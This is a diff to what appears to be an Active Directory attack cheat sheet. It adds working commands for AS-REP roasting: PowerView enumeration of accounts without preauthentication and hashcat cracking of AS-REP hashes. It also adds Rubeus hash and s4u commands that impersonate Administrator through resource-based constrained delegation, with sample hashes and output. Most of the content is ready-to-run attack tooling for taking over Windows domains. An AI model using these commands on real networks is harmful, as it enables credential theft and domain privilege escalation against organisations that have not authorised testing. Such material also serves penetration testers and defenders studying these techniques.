@@ -1126,7 +1126,7 @@ Mitigations:
 If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
 
 Prerequisite:
-- Accounts have to have **DONT_REQ_PREAUTH**
+- Accounts have to have **DONT_REQ_PREAUTH** (`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`)
 
 ```powershell
 C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
@@ -1178,6 +1178,7 @@ root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4r
 
 # crack AS_REP messages
 root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 ```
 
 Mitigations: 
@@ -1806,9 +1807,9 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 5. Use Rubeus to get hash from password
 
     ```powershell
-    Rubeus.exe hash /password:'Weakest123*' /user:swktest  /domain:factory.lan
+    Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan
     [*] Input password             : Weakest123*
-    [*] Input username             : swktest
+    [*] Input username             : swktest$
     [*] Input domain               : factory.lan
     [*] Salt                       : FACTORY.LANswktest
     [*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
@@ -1821,6 +1822,7 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 
     ```powershell
     .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
+    .\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
 
     [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
     [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
